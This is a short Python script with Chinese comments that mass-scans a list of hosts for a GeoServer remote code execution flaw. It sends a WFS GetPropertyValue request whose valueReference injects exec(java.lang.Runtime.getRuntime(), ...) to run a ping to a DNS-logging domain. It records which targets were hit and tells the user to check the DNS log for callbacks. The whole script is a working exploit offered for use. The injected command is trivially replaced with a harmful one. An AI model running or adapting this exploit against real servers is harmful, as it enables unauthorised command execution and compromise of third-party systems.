import requests
import time

# 读取目标列表
with open('1.txt', 'r') as file:
    targets = [line.strip() for line in file.readlines()]

# 设置请求头和SOAP请求体
headers = {
    "Content-Type": "application/xml",
}

# 需要替换为你控制的域名
dnslog_domain = 'z88k74.dnslog.cn'
xml_payload = f'''<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),"ping {dnslog_domain} -c 1")'>
 <wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>'''

# 设置超时时间
timeout = 10

# 打开文件记录每个目标的执行时间
with open('execution_times.txt', 'w') as exec_time_file, open('failed.txt', 'w') as failed_file:
    for target in targets:
        url = f"http://{target}/geoserver/wfs"
        try:
            response = requests.post(url, headers=headers, data=xml_payload, timeout=timeout)
            # 获取当前时间戳
            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            # 记录目标和执行时间
            exec_time_file.write(f"{url} - {current_time}\n")
            print(f"Executed: {url} - {current_time}")
        except requests.exceptions.RequestException as e:
            failed_file.write(f"{url} - {e}\n")
            print(f"Error with {url}: {e}")

print("检查DNS日志服务（如DNSLog）以确认是否有来自目标服务器的DNS请求。")